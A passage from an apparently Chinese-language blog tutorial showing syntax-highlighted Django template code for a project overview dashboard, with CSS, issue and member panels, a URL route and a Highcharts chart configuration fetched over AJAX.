class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/manage.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% load dashboard %&#125;</span><br><span class="line">&#123;% load issues %&#125;</span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.table-right</span> &gt; <span class="selector-tag">tbody</span> &gt; <span class="selector-tag">tr</span> &gt; <span class="selector-tag">td</span><span class="selector-class">.table-right</span> &#123;</span></span><br><span class="line">            width: 90px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.table-right</span> &gt; <span class="selector-tag">tbody</span> &gt; <span class="selector-tag">tr</span> &gt; <span class="selector-tag">td</span> &#123;</span></span><br><span class="line">            border: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.status-count</span> &#123;</span></span><br><span class="line">            text-align: center;</span><br><span class="line">            margin-top: 10px;</span><br><span class="line">            margin-bottom: 30px;</span><br><span class="line">            font-size: 14px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.status-count</span> <span class="selector-class">.count</span> &#123;</span></span><br><span class="line">            font-size: 25px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.status-count</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line">            text-decoration: none;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.user-item</span> <span class="selector-class">.title</span> &#123;</span></span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.user-item</span> <span class="selector-class">.avatar</span>, <span class="selector-class">.top-10</span> <span class="selector-class">.avatar</span> &#123;</span></span><br><span class="line">            float: left;</span><br><span class="line">            margin: 0 10px;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            width: 30px;</span><br><span class="line">            height: 30px;</span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#304659</span>;</span></span><br><span class="line">            color: white;</span><br><span class="line">            text-align: center;</span><br><span class="line">            line-height: 30px;</span><br><span class="line">            border-radius: 50%;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.user-item</span> <span class="selector-class">.text</span> &#123;</span></span><br><span class="line">            line-height: 30px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.top-10</span> <span class="selector-class">.avatar</span> &#123;</span></span><br><span class="line">            margin-right: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.top-10</span> <span class="selector-tag">td</span> &#123;</span></span><br><span class="line">            padding: 5px 10px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.top-10</span> <span class="selector-class">.table</span> &gt; <span class="selector-tag">tbody</span> &gt; <span class="selector-tag">tr</span> &gt; <span class="selector-tag">td</span> &#123;</span></span><br><span class="line">            border-top: 0;</span><br><span class="line"><span class="css">            <span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#ddd</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container-fluid"</span> <span class="attr">style</span>=<span class="string">"margin-top: 20px"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-bar-chart"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 新增问题趋势<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"chart"</span> <span class="attr">style</span>=<span class="string">"width: 100%;min-height: 200px"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-quora"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 问题<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                                &#123;% for key,item in status_dict.items %&#125;</span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4 status-count"</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'issues' project_id=request.tracer.project.id %&#125;?status=&#123;&#123; key &#125;&#125;"</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"count"</span>&gt;</span>&#123;&#123; item.count &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; item.text &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-user"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 项目成员<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body user-item"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-12 title"</span>&gt;</span>创建者<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"clearfix"</span> <span class="attr">style</span>=<span class="string">"margin-bottom: 30px"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"sol-sm-4"</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"avatar"</span>&gt;</span>&#123;&#123; request.tracer.project.creator.username.0 | upper &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text"</span>&gt;</span>&#123;&#123; request.tracer.project.creator.username &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-12 title"</span>&gt;</span>参与者<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                    &#123;% for user in user_list %&#125;</span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"sol-sm-4"</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"avatar"</span>&gt;</span>&#123;&#123; item.user__username.0 | upper &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text"</span>&gt;</span>&#123;&#123; item.user__username &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    &#123;% endfor %&#125;</span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-cog title-icon"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 详细<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-right"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"label-left"</span>&gt;</span>项目名称：<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; request.tracer.project.name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"label-left"</span>&gt;</span>项目描述：<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; request.tracer.project.desc &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"label-left"</span>&gt;</span>创建时间：<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; request.tracer.project.create_datetime &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"label-left"</span>&gt;</span>项目空间：<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;% user_space request.tracer.project.use_space %&#125;</span><br><span class="line">                                    /&#123;&#123; request.tracer.price_policy.project_space &#125;&#125; GB</span><br><span class="line">                                <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-list-ul"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 动态<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body top-10"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">                            &#123;% for item in top_ten %&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"avatar"</span>&gt;</span>&#123;&#123; item.creator.username.0|upper &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; item.creator.username &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span>&gt;</span>指派</span><br><span class="line">                                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'issues_detail' project_id=request.tracer.project.id issues_id=item.id %&#125;"</span>&gt;</span>&#123;% string_just item.id %&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                                            给 &#123;&#123; item.assign.username &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">"width: 156px"</span>&gt;</span></span><br><span class="line">                                        &#123;&#123; item.create_datetime &#125;&#125;</span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                            &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block js %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">      <span class="comment">// Hightchart</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h4 id="13-2-3-Hightchart画现状图统计问题"><a href="#13-2-3-Hightchart画现状图统计问题" class="headerlink" title="13.2.3 Hightchart画现状图统计问题"></a>13.2.3 Hightchart画现状图统计问题</h4><ul><li><p>构造Hightchart的url地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># 概览页面</span></span><br><span class="line">    ....</span><br><span class="line">    <span class="comment"># Hightchart</span></span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure></li><li><p>前端Hightchart配置</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/HighCharts/highcharts.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">       <span class="keyword">var</span> INIT_CHART = <span class="string">'&#123;% url '</span>issues_chart<span class="string">' project_id=request.tracer.project.id %&#125;'</span>;</span></span><br><span class="line">       Highcharts.setOptions(&#123;</span><br><span class="line">           global: &#123;</span><br><span class="line"><span class="actionscript">               useUTC: <span class="literal">false</span>,   <span class="comment">//highchart不使用UTC时间</span></span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="javascript">       $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">           initChart();</span><br><span class="line">       &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="actionscript">       <span class="function"><span class="keyword">function</span> <span class="title">initChart</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">           <span class="keyword">var</span> config = &#123;</span></span><br><span class="line">               title: &#123;</span><br><span class="line"><span class="actionscript">                   text: <span class="literal">null</span>, <span class="comment">// 不显示标题</span></span></span><br><span class="line">               &#125;,</span><br><span class="line">               yAxis: &#123;</span><br><span class="line">                   title: &#123;</span><br><span class="line"><span class="actionscript">                       text: <span class="string">'问题人数'</span>  <span class="comment">// y 轴文本提示</span></span></span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;,</span><br><span class="line">               xAxis: &#123;</span><br><span class="line"><span class="actionscript">                   type: <span class="string">'datetime'</span>,</span></span><br><span class="line"><span class="actionscript">                   tickInterval: <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">1000</span>,  <span class="comment">// 1天</span></span></span><br><span class="line">                   labels: &#123;</span><br><span class="line"><span class="actionscript">                       formatter: <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                           <span class="keyword">return</span> Highcharts.dateFormat(<span class="string">'%m-%d'</span>, <span class="keyword">this</span>.value);   <span class="comment">// 显示月日</span></span></span><br><span class="line">                       &#125;,</span><br><span class="line"><span class="actionscript">                       rotation: <span class="number">-30</span>   <span class="comment">// 点倾斜角度</span></span></span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;,</span><br><span class="line"><span class="actionscript">               tooltip: &#123;               <span class="comment">// 鼠标移动到点显示的内容</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                   headerFormat: '<span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;point.key&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>',</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                   pointFormat: '<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"color:&#123;series.color&#125;"</span>&gt;</span>\u25CF<span class="tag">&lt;/<span class="name">span</span>&gt;</span>数量：&#123;point.y&#125;',</span></span></span><br><span class="line"><span class="actionscript">                   xDateFormat: <span class="string">'%Y-%m-%d'</span>,</span></span><br><span class="line">               &#125;,</span><br><span class="line">               legend: &#123;</span><br><span class="line"><span class="actionscript">                   enabled: <span class="literal">false</span>,  <span class="comment">// 关闭图列提示</span></span></span><br><span class="line">               &#125;,</span><br><span class="line">               credits: &#123;</span><br><span class="line"><span class="actionscript">                   enabled: <span class="literal">false</span>,   <span class="comment">// 关闭版权信息</span></span></span><br><span class="line">               &#125;,</span><br><span class="line">               plotOptions: &#123;</span><br><span class="line">                   area: &#123;</span><br><span class="line"><span class="actionscript">                       stacking: <span class="string">'normal'</span>,</span></span><br><span class="line"><span class="actionscript">                       lineColor: <span class="string">'#666666'</span>,</span></span><br><span class="line">                       lineWidth: 1,</span><br><span class="line">                       marker: &#123;</span><br><span class="line">                           lineWidth: 1,</span><br><span class="line"><span class="actionscript">                           lineColor: <span class="string">'#666666'</span>,</span></span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;,</span><br><span class="line">               series: [&#123;</span><br><span class="line">                   data: []</span><br><span class="line">               &#125;],</span><br><span class="line">           &#125;;</span><br><span class="line">  </span><br><span class="line"><span class="javascript">           $.ajax(&#123;</span></span><br><span class="line">               url: INIT_CHART,</span><br><span class="line"><span class="actionscript">               type: <span class="string">"GET"</span>,</span></span><br><span class="line"><span class="actionscript">               dataType: <span class="string">"JSON"</span>,</span></span><br><span class="line"><span class="actionscript">               success: <span class="function"><span class="keyword">function</span> <span class="params">(res)</span> </span>&#123;</span></span><br><span class="line">                   config.series[0].data = res.data;</span><br><span class="line"><span class="actionscript">                   <span class="keyword">var</span> chart = Highcharts.chart(<span 